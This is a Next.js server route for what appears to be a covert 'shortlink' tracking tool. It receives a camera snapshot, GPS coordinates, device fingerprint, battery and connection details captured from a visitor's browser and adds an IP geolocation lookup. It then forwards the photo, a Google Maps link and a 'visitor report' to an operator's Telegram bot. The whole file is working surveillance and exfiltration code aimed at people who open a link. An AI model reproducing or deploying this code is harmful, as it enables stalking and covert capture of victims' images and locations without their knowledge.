import { NextResponse } from "next/server";
import axios from "axios";

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const {
      image = "",
      gps = null,
      device = {},
      battery = null,
      permissions = {},
      session = {},
      connection = null,
    } = body;

    const forwarded = req.headers.get("x-forwarded-for");
    const realIp = req.headers.get("x-real-ip");
    const clientIp = (forwarded?.split(",")[0]?.trim() || realIp || "1.1.1.1");

    const geoRes = await axios
      .get(`https://ip-api.com/json/${encodeURIComponent(clientIp)}`, {
        timeout: 5000,
        params: { fields: "status,message,query,city,regionName,country,isp,org,as,lat,lon,timezone" },
      })
      .catch(() => ({ data: {} }));

    const geo = geoRes.data || {};
    const gpsText = gps
      ? `${gps.lat}, ${gps.lon} (±${gps.accuracy ?? "?"}m)`
      : "Unavailable";

    let caption = `🚀 *SHORTLINK VISITOR REPORT*\n`;
    caption += `━━━━━━━━━━━━━━━━━━━━\n\n`;

    caption += `🌐 *NETWORK & GEO-IP*\n`;
    caption += `├ *IP:* \`${geo.query || clientIp}\`\n`;
    caption += `├ *ISP:* \`${geo.isp || "Unavailable"}\`\n`;
    caption += `├ *ORG:* \`${geo.org || "Unavailable"}\`\n`;
    caption += `└ *Location:* \`${geo.city || "?"}, ${geo.regionName || "?"}, ${geo.country || "?"}\`\n\n`;

    caption += `🎯 *GPS*\n`;
    caption += `├ *Coordinates:* \`${gpsText}\`\n`;
    if (gps) {
      caption += `└ *Maps:* https://www.google.com/maps?q=${gps.lat},${gps.lon}\n\n`;
    } else {
      caption += `└ *Maps:* Unavailable\n\n`;
    }

    caption += `📱 *DEVICE / BROWSER*\n`;
    caption += `├ *Model:* \`${device.model || "Unavailable"}\`\n`;
    caption += `├ *OS:* \`${device.os || "Unavailable"}\`\n`;
    caption += `├ *RAM:* \`${device.ram || "Unavailable"}\`\n`;
    caption += `├ *CPU:* \`${device.cpu || "Unavailable"}\`\n`;
    caption += `├ *GPU:* \`${device.gpu || "Unavailable"}\`\n`;
    caption += `├ *Language:* \`${device.language || "Unavailable"}\`\n`;
    caption += `├ *Timezone:* \`${device.timezone || "Unavailable"}\`\n`;
    caption += `└ *Screen:* \`${device.screen || "Unavailable"}\`\n\n`;

    caption += `🔋 *BATTERY*\n`;
    caption += `├ *Level:* \`${battery?.level ?? "Unavailable"}${battery?.level != null ? "%" : ""}\`\n`;
    caption += `└ *Charging:* \`${battery?.charging == null ? "Unavailable" : battery.charging ? "Yes" : "No"}\`\n\n`;

    caption += `🛡️ *PERMISSIONS*\n`;
    caption += `├ *Location:* \`${permissions.location || "not-granted"}\`\n`;
    caption += `└ *Camera:* \`${permissions.camera || "not-granted"}\`\n\n`;

    if (connection) {
      caption += `📶 *CONNECTION*\n`;
      caption += `├ *Type:* \`${connection.type || connection.effectiveType || "Unavailable"}\`\n`;
      caption += `├ *Downlink:* \`${connection.downlink ?? "Unavailable"} Mbps\`\n`;
      caption += `└ *RTT:* \`${connection.rtt ?? "Unavailable"} ms\`\n\n`;
    }

    if (session?.url || session?.linkName) {
      caption += `🔗 *SHORTLINK*\n`;
      if (session.linkName) caption += `├ *Name:* \`${session.linkName}\`\n`;
      if (session.url) caption += `└ *URL:* \`${session.url}\`\n\n`;
    }

    caption += `━━━━━━━━━━━━━━━━━━━━`;

    const botToken = process.env.TELEGRAM_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.error("Telegram configuration missing");
      return NextResponse.json({ error: "Telegram is not configured" }, { status: 500 });
    }

    const formData = new FormData();
    formData.append("chat_id", chatId);

    if (image) {
      const base64 = String(image).replace(/^data:image\/[^;]+;base64,/, "");
      const buffer = Buffer.from(base64, "base64");
      formData.append("photo", new Blob([buffer], { type: "image/jpeg" }), "capture.jpg");
      formData.append("caption", caption);
      formData.append("parse_mode", "Markdown");
      if (gps) {
        formData.append(
          "reply_markup",
          JSON.stringify({
            inline_keyboard: [[
              { text: "📍 Google Maps", url: `https://www.google.com/maps?q=${gps.lat},${gps.lon}` },
            ]],
          }),
        );
      }
    } else {
      formData.append("text", caption);
      formData.append("parse_mode", "Markdown");
    }

    const endpoint = image
      ? `https://api.telegram.org/bot${botToken}/sendPhoto`
      : `https://api.telegram.org/bot${botToken}/sendMessage`;

    const telegramResponse = await axios.post(endpoint, formData, {
      timeout: 15000,
      validateStatus: () => true,
    });

    if (!telegramResponse.data?.ok) {
      console.error("Telegram API error:", telegramResponse.data);
      return NextResponse.json(
        { error: "Telegram API rejected the request" },
        { status: 502 },
      );
    }

    return NextResponse.json({ success: true, telegram: true });
  } catch (error) {
    console.error("POST /api/snap failed:", error);
    return NextResponse.json(
      { error: "Failed to process visitor report" },
      { status: 500 },
    );
  }
}
